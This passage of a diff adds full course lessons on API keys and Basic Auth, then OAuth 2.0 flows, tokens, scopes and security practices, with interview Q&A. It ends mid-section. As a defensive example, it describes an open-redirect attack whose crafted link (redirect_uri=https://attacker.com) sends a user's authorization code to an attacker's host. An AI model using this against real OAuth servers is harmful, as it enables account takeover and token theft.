+                                    <tr>
+                                        <td><strong>Rotation</strong></td>
+                                        <td>Easy (generate new key)</td>
+                                        <td>Harder (change password)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Multiple Keys</strong></td>
+                                        <td>Yes (one per service)</td>
+                                        <td>No (one password)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Revocation</strong></td>
+                                        <td>Easy (delete specific key)</td>
+                                        <td>All or nothing</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Scoping</strong></td>
+                                        <td>Can scope permissions per key</td>
+                                        <td>Same permissions always</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Use Case</strong></td>
+                                        <td>API integrations</td>
+                                        <td>Simple authentication</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+
+                            <h2>Best Practices</h2>
+
+                            <h3>1. Multiple Keys Per User</h3>
+                            <div class="code-block">Allow users to create multiple API keys for different purposes
+
+Benefits:
+✅ Separate keys for dev/staging/production
+✅ Revoke one key without affecting others
+✅ Track usage per integration
+✅ Easier debugging (which service caused issue?)
+
+Example: GitHub Personal Access Tokens
+User creates:
+- "laptop-dev" key for local development
+- "ci-pipeline" key for GitHub Actions
+- "monitoring-service" key for Datadog
+
+If laptop stolen, revoke only "laptop-dev" key.</div>
+
+                            <h3>2. Key Scoping and Permissions</h3>
+                            <div class="code-block">Different keys with different permissions
+
+Example scopes:
+- read: Can read data
+- write: Can create/update data
+- delete: Can delete data
+- admin: Full access
+
+// Database schema
+APIKey {
+  id: uuid
+  userId: uuid
+  keyHash: string
+  scopes: ['read', 'write']  // Array of permissions
+  name: "CI Pipeline Key"
+  createdAt: timestamp
+}
+
+// Middleware
+function requireScope(scope) {
+  return async (req, res, next) => {
+    const apiKey = req.apiKey;  // From auth middleware
+    if (!apiKey.scopes.includes(scope)) {
+      return res.status(403).json({
+        error: 'Insufficient permissions',
+        required: scope,
+        granted: apiKey.scopes
+      });
+    }
+    next();
+  };
+}
+
+// Usage
+app.delete('/api/users/:id',
+  authenticateAPIKey,
+  requireScope('delete'),
+  deleteUser
+);
+
+Real example: GitHub tokens
+- repo (full repo access)
+- repo:status (just commit status)
+- public_repo (only public repos)
+- read:org (read org data)</div>
+
+                            <h3>3. Key Rotation</h3>
+                            <div class="code-block">Periodically rotate keys for security
+
+Strategy: Overlapping keys
+1. Generate new key (key2)
+2. Both key1 and key2 work
+3. Update services to use key2
+4. After transition period, revoke key1
+
+// Database: Track multiple active keys
+APIKey {
+  status: 'active' | 'rotating' | 'revoked'
+  expiresAt: timestamp
+}
+
+AWS example: Access Key rotation
+1. Create second access key
+2. Update apps to use new key
+3. Make old key inactive (test if anything breaks)
+4. Delete old key
+
+Automated rotation:
+- Schedule: Every 90 days
+- Alert: 30 days before expiration
+- Auto-revoke: Keys older than 180 days
+
+// Monitor key age
+SELECT name, created_at,
+       DATEDIFF(NOW(), created_at) as age_days
+FROM api_keys
+WHERE age_days > 90;</div>
+
+                            <h3>4. Rate Limiting Per Key</h3>
+                            <div class="code-block">Track and limit requests per API key
+
+// Rate limit by API key
+const rateLimit = {};
+
+function checkRateLimit(apiKey) {
+  const now = Date.now();
+  const windowStart = now - 60000;  // 1 minute window
+
+  if (!rateLimit[apiKey]) {
+    rateLimit[apiKey] = [];
+  }
+
+  // Remove old requests
+  rateLimit[apiKey] = rateLimit[apiKey].filter(time => time > windowStart);
+
+  // Check limit
+  if (rateLimit[apiKey].length >= 100) {  // 100 requests per minute
+    return false;  // Rate limited
+  }
+
+  // Add this request
+  rateLimit[apiKey].push(now);
+  return true;
+}
+
+// Middleware
+function rateLimitMiddleware(req, res, next) {
+  const apiKey = req.headers['x-api-key'];
+
+  if (!checkRateLimit(apiKey)) {
+    return res.status(429).json({
+      error: 'Rate limit exceeded',
+      limit: 100,
+      window: '1 minute',
+      retryAfter: 60
+    });
+  }
+
+  next();
+}
+
+Benefits:
+- Prevent abuse
+- Fair usage across users
+- Protect your infrastructure
+- Different limits per tier (free: 100/min, paid: 1000/min)</div>
+
+                            <h3>5. Key Revocation</h3>
+                            <div class="code-block">Provide easy way to revoke compromised keys
+
+// Revoke key
+app.delete('/api/keys/:keyId', async (req, res) => {
+  await APIKey.update(
+    { id: req.params.keyId, userId: req.user.id },
+    { status: 'revoked', revokedAt: new Date() }
+  );
+
+  res.json({ message: 'Key revoked successfully' });
+});
+
+Soft delete vs hard delete:
+✅ Soft delete: Keep record for audit
+- status = 'revoked'
+- Can investigate past usage
+- Compliance and logging
+
+❌ Hard delete: Remove from database
+- No audit trail
+- Can't investigate breaches
+
+Revocation scenarios:
+- User requests revocation
+- Key compromised (detected in GitHub leak)
+- Account security event (password change)
+- Suspicious activity detected
+- Key age exceeded policy</div>
+
+                            <h2>Security Best Practices</h2>
+
+                            <h3>1. Always Use HTTPS</h3>
+                            <div class="code-block">❌ NEVER send API keys over HTTP
+http://api.example.com?api_key=abc123
+
+HTTP = Plain text = Anyone on network can intercept
+
+✅ Always use HTTPS
+https://api.example.com
+
+Enforce HTTPS:
+// Redirect HTTP to HTTPS
+app.use((req, res, next) => {
+  if (!req.secure && process.env.NODE_ENV === 'production') {
+    return res.redirect('https://' + req.headers.host + req.url);
+  }
+  next();
+});
+
+// Or reject HTTP requests
+if (!req.secure) {
+  return res.status(403).json({ error: 'HTTPS required' });
+}</div>
+
+                            <h3>2. Don't Commit Keys to Git</h3>
+                            <div class="code-block">❌ NEVER do this:
+// config.js
+const API_KEY = 'your_api_key_here';  // ← Committed to Git!
+
+Git history is permanent. Even if you delete the file later,
+the key is still in history. Attackers scan GitHub for keys.
+
+✅ Use environment variables:
+// .env file (add to .gitignore!)
+API_KEY=your_api_key_here
+
+// .gitignore
+.env
+.env.local
+.env.*.local
+
+// Access in code
+const apiKey = process.env.API_KEY;
+
+// Or use secret management
+// AWS Secrets Manager, HashiCorp Vault, etc.
+
+If key leaked:
+1. Revoke immediately
+2. Generate new key
+3. Rotate credentials
+4. Check for unauthorized usage</div>
+
+                            <h3>3. Key Compromise Detection</h3>
+                            <div class="code-block">Monitor for compromised keys
+
+Indicators:
+- Requests from unusual IPs
+- Spike in request volume
+- Access patterns change (new endpoints)
+- Requests from new geographies
+- Multiple failed auth attempts
+
+// Log suspicious activity
+{
+  "event": "api_key_usage",
+  "keyId": "key_abc123",
+  "ip": "203.0.113.45",
+  "userAgent": "...",
+  "endpoint": "/api/users",
+  "timestamp": "2024-01-15T10:30:00Z"
+}
+
+// Alert on anomalies
+if (ip not in usual_ips or request_rate > threshold) {
+  alert("Potential key compromise");
+  optionally_rotate_key();
+}
+
+GitHub example:
+Scans public repos for exposed keys
+→ Sends alert
+→ Auto-revokes key</div>
+
+                            <h2>Real-World Examples</h2>
+
+                            <h3>Stripe API Keys</h3>
+                            <div class="code-block">Stripe has excellent key management
+
+Test vs Live:
+sk_test_... → Test mode (fake payments)
+sk_live_... → Production (real money!)
+
+Publishable vs Secret:
+pk_... → Publishable (safe in frontend)
+       → Can only create payment intents
+sk_... → Secret (backend only)
+       → Full API access
+
+// Frontend (safe)
+stripe = Stripe('pk_test_your_key...');
+
+// Backend (secret)
+const stripe = require('stripe')('your_secret_key');
+
+Benefits:
+✅ Can't accidentally charge real cards in test mode
+✅ Frontend can create charges without backend
+✅ Secret key never exposed to users
+
+Key restrictions:
+- IP whitelist
+- Domain restrictions for publishable keys
+- Webhook signing secrets (separate)</div>
+
+                            <h3>GitHub Personal Access Tokens</h3>
+                            <div class="code-block">Fine-grained permissions
+
+User creates token with specific scopes:
+☑ repo          (full repo access)
+☑ read:org      (read organization data)
+☐ delete:repo   (can delete repositories)
+☐ admin:public_key
+
+// Use token
+curl -H "Authorization: token ghp_abc123..." \
+     https://api.github.com/user/repos
+
+Benefits:
+✅ Least privilege (only needed scopes)
+✅ Multiple tokens (one per service)
+✅ Easy revocation
+✅ Expiration dates
+✅ Last used timestamp (detect unused tokens)
+
+Token formats:
+ghp_... → Personal access token
+gho_... → OAuth token
+ghs_... → Server-to-server token</div>
+
+                            <h3>AWS Access Keys</h3>
+                            <div class="code-block">Access Key ID + Secret Access Key
+
+Format:
+Access Key ID: AKIAIOSFODNN7EXAMPLE
+Secret Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+
+Usage:
+// AWS SDK
+const AWS = require('aws-sdk');
+AWS.config.update({
+  accessKeyId: 'AKIAIOSFODNN7EXAMPLE',
+  secretAccessKey: 'wJalrXUtnFEMI/...'
+});
+
+Best practices:
+✅ Use IAM roles instead (no keys needed)
+✅ Rotate keys every 90 days
+✅ Never commit to code
+✅ Use AWS Secrets Manager
+✅ Enable MFA for sensitive operations
+
+IAM role (better):
+No keys needed! AWS automatically provides temporary credentials
+Perfect for EC2, Lambda, ECS</div>
+
+                            <h2>Summary</h2>
+                            <p>API Keys and Basic Auth are simple authentication methods with specific use cases:</p>
                             <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li>Stripe API key prefixes (sk_, pk_)</li>
-                                <li>AWS access keys</li>
-                                <li>GitHub personal access tokens</li>
-                                <li>API key in header vs query param</li>
+                                <li><strong>API Keys:</strong> Single token for app authentication, ideal for server-to-server</li>
+                                <li><strong>Basic Auth:</strong> Username+password Base64 encoded, simple but requires HTTPS</li>
+                                <li>Generate keys cryptographically (32+ bytes random)</li>
+                                <li>Use prefixes to identify key types (sk_live_, pk_test_)</li>
+                                <li>Store hashed keys (never plain text)</li>
+                                <li>Send in headers (never query params or URLs)</li>
+                                <li>Enable multiple keys per user for easy rotation and revocation</li>
+                                <li>Implement key scoping for fine-grained permissions</li>
+                                <li>Always use HTTPS</li>
+                                <li>Rate limit per key and monitor for compromise</li>
                             </ul>
                         `,
-                        interviews: []
+                        interviews: [
+                            {
+                                question: "What's the difference between API keys and Basic Auth, and when should you use each?",
+                                answer: "API Keys: Single long random token, identifies application, easy to rotate (generate new key), supports multiple keys per user for different services, can scope permissions per key. Use for: server-to-server, third-party integrations, developer APIs. Basic Auth: Username+password Base64 encoded (NOT encrypted), sent every request, all-or-nothing permissions, harder to rotate. Use for: simple internal tools, admin interfaces, prototyping. Both require HTTPS. Modern recommendation: API keys over Basic Auth for flexibility and security."
+                            },
+                            {
+                                question: "Why should you never put API keys in URLs as query parameters?",
+                                answer: "Query parameters are logged everywhere: server logs (visible to admins), proxy/CDN logs, browser history, analytics tools. Also sent in Referer header to third-party sites when user clicks external links. If API key in URL, it's exposed in all these places. Example: GET /api/users?api_key=secret123 → logged in Nginx, CloudFlare, Google Analytics, browser history. Use headers instead: X-API-Key: secret123. Headers not logged by default, not cached, not in browser history. Only exception: temporary one-time read-only tokens."
+                            },
+                            {
+                                question: "How should API keys be stored in the database and why?",
+                                answer: "NEVER store plain text keys! Hash them like passwords using bcrypt or SHA-256. Reason: If database breached, plain keys compromise all accounts immediately. With hashing: attacker gets hashes, can't use them directly. Implementation: When user creates key → generate random string → show to user ONCE → store hash in database. When validating: hash provided key → compare with stored hash. Also store key prefix (first 8 chars) for user reference. Similar to password reset: 'We can't show you your key, but you can generate a new one'."
+                            },
+                            {
+                                question: "What are the benefits of using API key prefixes like Stripe's sk_live_, sk_test_?",
+                                answer: "Prefixes identify key type and environment at a glance. Benefits: 1) Easy to spot (sk_ = secret, pk_ = publishable). 2) Prevent mistakes (can't accidentally use test key in production). 3) Different permissions (pk_ keys limited to safe operations). 4) Bulk revocation (revoke all test keys). 5) Scanning code for exposed secrets (search for sk_live_). 6) Rate limiting per type. Format: <type>_<environment>_<random>. Example: your_live_key... = secret key, live environment. Similar pattern: GitHub's ghp_ (personal), gho_ (OAuth), ghs_ (server)."
+                            },
+                            {
+                                question: "What is Basic Auth and why must it only be used over HTTPS?",
+                                answer: "Basic Auth: Username and password combined with colon (user:pass), Base64 encoded, sent in Authorization header. Example: user:secret123 → Base64 encode → dXNlcjpzZWNyZXQxMjM= → Header: Authorization: Basic dXNlcjpzZWNyZXQxMjM=. CRITICAL: Base64 is encoding, NOT encryption! Anyone can decode instantly. Over HTTP (not HTTPS), credentials sent in plain text, visible to anyone on network (WiFi, ISP, attackers). Over HTTPS, encrypted in transit. Basic Auth over HTTP = handing password to anyone listening. Always require HTTPS for Basic Auth."
+                            },
+                            {
+                                question: "Explain the strategy for rotating API keys without causing downtime.",
+                                answer: "Use overlapping keys strategy: 1) Generate new key (key2) while key1 still active. 2) Both keys work simultaneously (transition period). 3) Update all services to use key2. 4) Monitor for any requests still using key1. 5) After transition period (e.g., 30 days), revoke key1. Benefits: Zero downtime, time to update services, can rollback if issues. AWS example: Create second access key → update apps → make old key inactive (test) → delete old key. Automated: Alert 30 days before expiration, auto-revoke keys > 180 days old. Database: Track status (active/rotating/revoked) and multiple keys per user."
+                            }
+                        ]
                     },
                     {
                         id: 'oauth2',
                         title: 'OAuth 2.0 Flows',
                         duration: '55 min',
                         content: `
-                            <h2>OUTLINE: OAuth 2.0</h2>
+                            <h2>What is OAuth 2.0?</h2>
+                            <p>OAuth 2.0 is an authorization framework that allows applications to access user resources without exposing passwords. It solves the problem of delegated authorization: "How can I let App A access my data on Service B without giving App A my Service B password?"</p>
 
-                            <h3>Topics to Cover:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>OAuth 2.0 Fundamentals</strong>
-                                    - What OAuth solves (delegated authorization)
-                                    - Roles: Resource Owner, Client, Authorization Server, Resource Server
-                                    - Grant types overview
-                                </li>
-                                <li><strong>Authorization Code Flow</strong>
-                                    - Most secure flow for web apps
-                                    - Step-by-step process
-                                    - PKCE extension for security
-                                    - Refresh tokens
-                                </li>
-                                <li><strong>Other Grant Types</strong>
-                                    - Implicit Flow (deprecated, use Auth Code + PKCE)
-                                    - Client Credentials (machine-to-machine)
-                                    - Resource Owner Password (legacy, avoid)
-                                    - Device Flow (smart TVs, CLIs)
-                                </li>
-                                <li><strong>Tokens</strong>
-                                    - Access tokens (short-lived)
-                                    - Refresh tokens (long-lived)
-                                    - Token storage and security
-                                    - Token revocation
-                                </li>
-                                <li><strong>Scopes & Permissions</strong>
-                                    - Defining scopes
-                                    - Requesting specific permissions
-                                    - Incremental authorization
-                                </li>
-                            </ul>
+                            <h3>The Problem OAuth Solves</h3>
+                            <div class="code-block">Before OAuth (BAD):
+User wants to let "Photo Printer" app access their Google Photos
 
-                            <h3>Examples to Include:</h3>
+❌ User gives Photo Printer their Google password
+❌ Photo Printer stores the password
+❌ Photo Printer has full access to Google account
+❌ User can't revoke access without changing password
+❌ If Photo Printer is hacked, Google account is compromised
+
+With OAuth (GOOD):
+✅ User authorizes Photo Printer via Google's consent screen
+✅ Photo Printer receives temporary access token
+✅ Token only grants access to photos (limited scope)
+✅ User can revoke access anytime
+✅ Password never shared</div>
+
+                            <h2>OAuth 2.0 Roles</h2>
+
+                            <h3>The Four Roles</h3>
+                            <div class="code-block">1. Resource Owner (User)
+   - The person who owns the data
+   - Example: You with your Google Photos
+
+2. Client (Application)
+   - The app requesting access
+   - Example: "Photo Printer" app
+
+3. Authorization Server
+   - Handles authentication and authorization
+   - Issues tokens
+   - Example: Google's OAuth server (accounts.google.com)
+
+4. Resource Server
+   - Hosts the protected resources
+   - Validates access tokens
+   - Example: Google Photos API server</div>
+
+                            <h3>Real-World Example</h3>
+                            <div class="code-block">Scenario: "Sign in with GitHub" button on a website
+
+Resource Owner: You (GitHub user)
+Client: The website (e.g., dev.to)
+Authorization Server: GitHub OAuth (github.com/login/oauth)
+Resource Server: GitHub API (api.github.com)
+
+Flow:
+1. You click "Sign in with GitHub"
+2. Redirected to GitHub (Authorization Server)
+3. GitHub asks: "dev.to wants to access your profile"
+4. You approve
+5. GitHub issues access token to dev.to
+6. dev.to uses token to call GitHub API
+7. You're logged in!</div>
+
+                            <h2>OAuth 2.0 Grant Types (Flows)</h2>
+
+                            <h3>1. Authorization Code Flow (Most Common & Secure)</h3>
+                            <p>Used by web applications with a backend. Most secure because client secret stays on server.</p>
+
+                            <h4>Step-by-Step Process</h4>
+                            <div class="code-block">Step 1: Client redirects user to Authorization Server
+GET https://accounts.google.com/o/oauth2/v2/auth?
+  response_type=code&
+  client_id=YOUR_CLIENT_ID&
+  redirect_uri=https://yourapp.com/callback&
+  scope=profile email&
+  state=random_string_for_csrf_protection
+
+Step 2: User sees consent screen
+"YourApp wants to access your profile and email"
+[Allow] [Deny]
+
+Step 3: User approves, Authorization Server redirects back
+GET https://yourapp.com/callback?
+  code=AUTHORIZATION_CODE&
+  state=random_string_for_csrf_protection
+
+Step 4: Client exchanges code for tokens (backend)
+POST https://oauth2.googleapis.com/token
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=authorization_code&
+code=AUTHORIZATION_CODE&
+client_id=YOUR_CLIENT_ID&
+client_secret=YOUR_CLIENT_SECRET&
+redirect_uri=https://yourapp.com/callback
+
+Response:
+{
+  "access_token": "ya29.a0AfH6SMBx...",
+  "expires_in": 3600,
+  "token_type": "Bearer",
+  "scope": "profile email",
+  "refresh_token": "1//0gHKxY..."
+}
+
+Step 5: Client uses access token to call API
+GET https://www.googleapis.com/oauth2/v1/userinfo
+Authorization: Bearer ya29.a0AfH6SMBx...</div>
+
+                            <h4>Security Features</h4>
+                            <div class="code-block">1. Authorization code is single-use, short-lived
+2. Client secret never exposed to browser
+3. State parameter prevents CSRF attacks
+4. Code can't be used without client secret
+5. Redirect URI must match registered URI</div>
+
+                            <h3>2. Authorization Code Flow with PKCE</h3>
+                            <p>PKCE (Proof Key for Code Exchange) adds extra security for public clients like mobile apps and SPAs where client secret can't be kept secret.</p>
+
+                            <h4>PKCE Enhancement</h4>
+                            <div class="code-block">Problem: Mobile/SPA apps can't store client_secret securely
+Solution: PKCE uses dynamically generated secret per request
+
+Step 1: Client generates code_verifier and code_challenge
+code_verifier = random 43-128 character string
+code_challenge = base64url(sha256(code_verifier))
+
+Step 2: Authorization request includes code_challenge
+GET https://accounts.google.com/o/oauth2/v2/auth?
+  response_type=code&
+  client_id=YOUR_CLIENT_ID&
+  redirect_uri=https://yourapp.com/callback&
+  scope=profile&
+  code_challenge=BASE64URL_ENCODED_CHALLENGE&
+  code_challenge_method=S256
+
+Step 3: Token request includes code_verifier
+POST https://oauth2.googleapis.com/token
+
+grant_type=authorization_code&
+code=AUTHORIZATION_CODE&
+client_id=YOUR_CLIENT_ID&
+redirect_uri=https://yourapp.com/callback&
+code_verifier=ORIGINAL_CODE_VERIFIER
+
+Server verifies: sha256(code_verifier) == code_challenge
+
+Why it works:
+- Attacker intercepts code but doesn't have code_verifier
+- Can't use code without original code_verifier
+- Each authorization has unique verifier/challenge pair</div>
+
+                            <p><strong>Real Example - GitHub OAuth with PKCE:</strong></p>
+                            <div class="code-block">// Mobile app or SPA should use PKCE
+// Generate code verifier
+const codeVerifier = generateRandomString(128);
+const codeChallenge = base64url(sha256(codeVerifier));
+
+// Authorization request
+window.location = 'https://github.com/login/oauth/authorize?' +
+  'client_id=Iv1.abc123&' +
+  'redirect_uri=myapp://callback&' +
+  'scope=user repo&' +
+  'code_challenge=' + codeChallenge + '&' +
+  'code_challenge_method=S256';
+
+// After user approves, exchange code with verifier
+POST https://github.com/login/oauth/access_token
+{
+  "client_id": "Iv1.abc123",
+  "code": "received_code",
+  "code_verifier": codeVerifier,
+  "redirect_uri": "myapp://callback"
+}</div>
+
+                            <h3>3. Client Credentials Flow</h3>
+                            <p>For machine-to-machine communication. No user involved. Used for backend services accessing APIs.</p>
+
+                            <div class="code-block">// Service A wants to call Service B's API
+POST https://oauth-server.com/token
+Content-Type: application/x-www-form-urlencoded
+Authorization: Basic base64(client_id:client_secret)
+
+grant_type=client_credentials&
+scope=api.read api.write
+
+Response:
+{
+  "access_token": "eyJhbGciOiJSUzI1NiIs...",
+  "token_type": "Bearer",
+  "expires_in": 3600,
+  "scope": "api.read api.write"
+}
+
+// Use token to call API
+GET https://api.service-b.com/data
+Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
+
+Use cases:
+- Cron jobs calling APIs
+- Backend service to service communication
+- CI/CD pipelines
+- System automation
+
+Example: GitHub Actions accessing GitHub API
+Example: Microservice A calling Microservice B</div>
+
+                            <h3>4. Implicit Flow (Deprecated)</h3>
+                            <div class="code-block">⚠️ DEPRECATED - DO NOT USE
+
+Old flow for SPAs, tokens returned directly in URL fragment
+Problems:
+- Access token exposed in browser history
+- Access token exposed to JavaScript
+- No refresh token support
+- Less secure than Auth Code + PKCE
+
+❌ DON'T USE:
+response_type=token
+
+✅ USE INSTEAD:
+response_type=code with PKCE (Authorization Code Flow)
+
+All modern SPAs should use Auth Code + PKCE</div>
+
+                            <h3>5. Resource Owner Password Credentials (Legacy)</h3>
+                            <div class="code-block">⚠️ LEGACY - AVOID IF POSSIBLE
+
+User provides username/password directly to client app
+
+POST https://oauth-server.com/token
+
+grant_type=password&
+username=user@example.com&
+password=secret123&
+client_id=YOUR_CLIENT_ID
+
+Only use when:
+- First-party apps (bank's official app)
+- Migration from legacy system
+- No other option available
+
+Problems:
+❌ Client sees user's password
+❌ Defeats purpose of OAuth
+❌ No consent screen
+❌ Less secure
+
+Prefer: Authorization Code Flow when possible</div>
+
+                            <h3>6. Device Flow</h3>
+                            <p>For devices with limited input (smart TVs, IoT devices, CLI tools).</p>
+
+                            <div class="code-block">Step 1: Device requests device code
+POST https://oauth-server.com/device/code
+
+client_id=YOUR_CLIENT_ID&
+scope=user.read
+
+Response:
+{
+  "device_code": "NGU5OWFiNjQ...",
+  "user_code": "WDJB-MJHT",
+  "verification_uri": "https://example.com/device",
+  "expires_in": 1800,
+  "interval": 5
+}
+
+Step 2: Device shows user code
+"Visit example.com/device and enter code: WDJB-MJHT"
+
+Step 3: User visits URL on phone/computer, enters code
+
+Step 4: Device polls for token
+POST https://oauth-server.com/token
+
+grant_type=urn:ietf:params:oauth:grant-type:device_code&
+device_code=NGU5OWFiNjQ...&
+client_id=YOUR_CLIENT_ID
+
+Polling response (until user approves):
+{
+  "error": "authorization_pending"
+}
+
+After user approves:
+{
+  "access_token": "eyJhbGciOiJSUzI1NiIs...",
+  "token_type": "Bearer",
+  "expires_in": 3600,
+  "refresh_token": "..."
+}
+
+Real Example: GitHub CLI (gh auth login)
+Real Example: YouTube on Smart TV</div>
+
+                            <h2>Tokens in OAuth 2.0</h2>
+
+                            <h3>Access Token</h3>
+                            <div class="code-block">Purpose: Grants access to protected resources
+Format: Opaque string or JWT
+Lifetime: Short (15 minutes to 1 hour typical)
+Storage: Memory (preferred) or secure storage
+Usage: Sent with every API request
+
+Example:
+Authorization: Bearer ya29.a0AfH6SMBx...
+
+Why short-lived?
+- Limits damage if token is stolen
+- Reduces need for real-time validation
+- Encourages use of refresh tokens</div>
+
+                            <h3>Refresh Token</h3>
+                            <div class="code-block">Purpose: Obtain new access tokens without re-authentication
+Format: Opaque string
+Lifetime: Long (days, weeks, or months)
+Storage: Secure storage only (encrypted database)
+Usage: Exchange for new access token when expired
+
+Refresh token flow:
+POST https://oauth-server.com/token
+
+grant_type=refresh_token&
+refresh_token=REFRESH_TOKEN&
+client_id=YOUR_CLIENT_ID&
+client_secret=YOUR_CLIENT_SECRET
+
+Response:
+{
+  "access_token": "new_access_token",
+  "expires_in": 3600,
+  "refresh_token": "new_refresh_token"  // Token rotation
+}
+
+Best practices:
+✅ Rotate refresh tokens (issue new one each use)
+✅ Store encrypted
+✅ Bind to device/user
+✅ Allow revocation
+✅ Monitor for unusual usage</div>
+
+                            <h3>Token Storage Security</h3>
+                            <div class="code-block">Browser (SPA):
+❌ localStorage - vulnerable to XSS
+❌ sessionStorage - vulnerable to XSS
+✅ Memory only (lost on refresh)
+✅ httpOnly cookies (if same domain)
+
+Mobile App:
+✅ Keychain (iOS)
+✅ Keystore (Android)
+❌ Shared Preferences - not secure
+
+Backend:
+✅ Encrypted database
+✅ Secure key management (KMS)
+❌ Plain text - never!
+
+Best practice:
+- Access token: Memory or httpOnly cookie
+- Refresh token: Secure server-side storage only</div>
+
+                            <h2>Scopes and Permissions</h2>
+
+                            <h3>What are Scopes?</h3>
+                            <div class="code-block">Scopes define what access the token grants
+Like permissions: "read profile", "write posts", "delete account"
+
+Format: Space-separated strings
+scope=profile email openid
+
+Common patterns:
+- resource.action: user.read, user.write
+- namespace: https://api.example.com/scopes/admin
+- hierarchical: profile profile.email profile.photos
+
+Examples by platform:
+
+GitHub:
+scope=repo user:email read:org
+
+Google:
+scope=https://www.googleapis.com/auth/userinfo.profile
+      https://www.googleapis.com/auth/userinfo.email
+
+Microsoft:
+scope=User.Read Mail.Send</div>
+
+                            <h3>Requesting Scopes</h3>
+                            <div class="code-block">// Request specific scopes
+GET https://accounts.google.com/o/oauth2/v2/auth?
+  client_id=YOUR_CLIENT_ID&
+  redirect_uri=https://yourapp.com/callback&
+  response_type=code&
+  scope=profile email https://www.googleapis.com/auth/calendar.readonly
+
+User sees:
+"YourApp wants to:
+ ✓ View your profile
+ ✓ View your email address
+ ✓ View your Google Calendar events"
+
+// Response includes granted scopes
+{
+  "access_token": "...",
+  "scope": "profile email https://www.googleapis.com/auth/calendar.readonly"
+}
+
+User can approve subset of requested scopes!
+Request: profile email calendar
+Granted: profile email
+(User denied calendar access)</div>
+
+                            <h3>Incremental Authorization</h3>
+                            <div class="code-block">Don't request all permissions upfront
+Request permissions when needed (better UX)
+
+Initial login:
+scope=profile email
+→ User grants basic profile
+
+Later, when user wants to import calendar:
+scope=https://www.googleapis.com/auth/calendar.readonly
+→ User grants calendar access
+
+Benefits:
+✅ Less scary consent screen
+✅ User understands why permission needed
+✅ Higher approval rate
+✅ Better trust
+
+Example: Google Drive app
+- Login: profile email
+- View files: drive.readonly
+- Edit files: drive.file
+- Full access: drive</div>
+
+                            <h2>OAuth 2.0 Security Best Practices</h2>
+
+                            <h3>1. Always Use HTTPS</h3>
+                            <div class="code-block">❌ NEVER use OAuth over HTTP
+Tokens, codes, and client secrets would be exposed!
+
+✅ All OAuth endpoints must use HTTPS:
+- Authorization endpoint
+- Token endpoint
+- Redirect URI
+- API endpoints</div>
+
+                            <h3>2. Validate Redirect URI</h3>
+                            <div class="code-block">❌ Open redirect vulnerability
+Authorization Server MUST validate redirect_uri matches
+registered URI exactly
+
+Attack without validation:
+1. Attacker creates link:
+   /authorize?redirect_uri=https://attacker.com&...
+2. User approves
+3. Code sent to attacker.com!
+
+✅ Server validates redirect_uri
+✅ Register specific URIs (no wildcards)
+✅ Exact match required</div>
+
+                            <h3>3. Use State Parameter</h3>
+                            <div class="code-block">Prevents CSRF attacks
+
+Client generates random state:
+const state = generateRandomString(32);
+sessionStorage.setItem('oauth_state', state);
+
+Authorization request:
+/authorize?state=abc123xyz...
+
+Callback:
+/callback?code=...&state=abc123xyz
+
+Client validates:
+if (receivedState !== sessionStorage.getItem('oauth_state')) {
+  throw new Error('CSRF attack detected!');
+}
+
+Without state, attacker can trick user into authorizing
+attacker's account!</div>
+
+                            <h3>4. Token Validation</h3>
+                            <div class="code-block">Resource Server MUST validate access tokens:
+
+1. Signature verification (if JWT)
+2. Expiration check (exp claim)
+3. Audience check (aud claim)
+4. Issuer check (iss claim)
+5. Scope verification
+
+// Example JWT validation
+const jwt = require('jsonwebtoken');
+
+try {
+  const decoded = jwt.verify(token, PUBLIC_KEY, {
+    algorithms: ['RS256'],
+    audience: 'https://api.yourservice.com',
+    issuer: 'https://auth.yourservice.com'
+  });
+
+  // Check scopes
+  if (!decoded.scope.includes('api.read')) {
+    return 403 Forbidden;
+  }
+
+  // Token valid, proceed
+} catch (err) {
+  return 401 Unauthorized;
+}</div>
+
+                            <h2>Real-World OAuth Examples</h2>
+
+                            <h3>GitHub OAuth</h3>
+                            <div class="code-block">// 1. Redirect to GitHub
+const clientId = 'Iv1.abc123';
+const redirectUri = 'https://myapp.com/callback';
+const scope = 'user repo';
+
+window.location = \`https://github.com/login/oauth/authorize?
+  client_id=\${clientId}&
+  redirect_uri=\${redirectUri}&
+  scope=\${scope}\`;
+
+// 2. GitHub redirects back with code
+// GET /callback?code=abc123def
+
+// 3. Exchange code for token (backend)
+POST https://github.com/login/oauth/access_token
+Content-Type: application/json
+Accept: application/json
+
+{
+  "client_id": "Iv1.abc123",
+  "client_secret": "secret",
+  "code": "abc123def"
+}
+
+Response:
+{
+  "access_token": "gho_abc123",
+  "token_type": "bearer",
+  "scope": "user,repo"
+}
+
+// 4. Use token to call GitHub API
+GET https://api.github.com/user
+Authorization: Bearer gho_abc123</div>
+
+                            <h3>Google OAuth (Sign in with Google)</h3>
+                            <div class="code-block">// Using Google's OAuth 2.0 library
+<script src="https://accounts.google.com/gsi/client"></script>
+
+<!-- Button -->
+<div id="g_id_onload"
+     data-client_id="YOUR_CLIENT_ID"
+     data-callback="handleCredentialResponse">
+</div>
+
+<script>
+function handleCredentialResponse(response) {
+  // response.credential is a JWT ID token
+  const idToken = response.credential;
+
+  // Send to backend for verification
+  fetch('/api/auth/google', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({token: idToken})
+  });
+}
+</script>
+
+// Backend verifies ID token
+const {OAuth2Client} = require('google-auth-library');
+const client = new OAuth2Client(CLIENT_ID);
+
+async function verify(token) {
+  const ticket = await client.verifyIdToken({
+    idToken: token,
+    audience: CLIENT_ID
+  });
+  const payload = ticket.getPayload();
+  const userId = payload['sub'];
+  const email = payload['email'];
+  const name = payload['name'];
+
+  // Create session for user
+}</div>
+
+                            <h2>Common OAuth Mistakes</h2>
+
+                            <h3>1. Using Implicit Flow</h3>
+                            <div class="code-block">❌ BAD: response_type=token (Implicit Flow)
+Tokens exposed in URL, browser history, less secure
+
+✅ GOOD: response_type=code with PKCE
+More secure, works for SPAs and mobile apps</div>
+
+                            <h3>2. Not Validating State Parameter</h3>
